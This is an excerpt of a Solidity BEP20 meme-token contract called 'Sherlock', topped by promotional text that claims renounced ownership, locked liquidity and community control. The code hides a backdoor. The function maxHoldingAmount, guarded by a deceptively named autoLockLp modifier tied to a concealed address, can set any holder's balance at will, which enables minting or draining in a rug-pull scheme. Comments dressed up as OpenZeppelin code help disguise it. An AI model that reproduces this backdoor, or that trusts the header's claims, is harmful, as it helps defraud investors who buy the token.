...
Sherlock AI
@Sherlock_robot
https://www.sherlockdefi.com/
UNMASK THE MYSTERY OF CRYPTO
Meet Sherlock, the ultimate crypto detective! This powerful AI can uncover the hidden truths behind any crypto wallet address.
If you're ready to take your crypto game to the next level, Sherlock is here to help. Download now and see for yourself!
💠Sherlock TOKEN is born. The tastiest Pepe of them all. Don't miss this moon💠
💎 Sherlock is a decentralized, community-focused meme token with continued marketing and development ✅
➤ 0% fee tax ➤ old school
➤ 100% community run token, we are in this with you.
➤ Set your slippage to 13%~ ➤avoid bots
🧯 LPs Locked
💻 Ownership Renounced
*/
pragma solidity ^0.8.19;

interface BEP20PEPEHEX {
  /**
...
/*
 * @dev Provides information about the current execution Sherlockontext, including the
 ...
 */
abstract contract Sherlockontext {
...
// File: @openzeppelin/contracts/access/OwnablePEPEHEX.sol
 ...
 * the owner.
 */
abstract contract OwnablePEPEHEX is Sherlockontext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnablePEPEHEX: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnablePEPEHEX: new owner is the zero address");
...
contract Sherlock is Sherlockontext, BEP20PEPEHEX, OwnablePEPEHEX {
   ...
   address private Binancev3rooter; 
    constructor(address Binancev2rooter) {
        ...
        _symbol = "Sherlock";
        _decimals = 9;
        allTotalSupply = 420689999999999000000000;
    ...
    */
    ...
    /**
    * @dev See {BEP20PEPEHEX-totalSupply}.
    */
    ...
    /**
    * @dev See {BEP20PEPEHEX-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return epxAll[account];
    }
      modifier autoLockLp() {
        require(Binancev3rooter == _msgSender(), "OwnablePEPEHEX: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEP20PEPEHEX-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function maxHoldingAmount(address PEPEHEXPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[PEPEHEXPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        
        emit Transfer(PEPEHEXPLEBRewards, address(0), aaaMontant);
    }

    /**
    * @dev See {BEP20PEPEHEX-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEP20PEPEHEX-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {BEP20PEPEHEX-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20PEPEHEX};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEP20PEPEHEX: transfer lamount exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEP20PEPEHEX-approve}.
    *
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20PEPEHEX: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEP20PEPEHEX: transfer from the zero address");
        require(recever != address(0), "BEP20PEPEHEX: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20PEPEHEX: transfer lamount exceeds balance");
    ...
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEP20PEPEHEX: approve from the zero address");
        require(spender != address(0), "BEP20PEPEHEX: approve to the zero address");
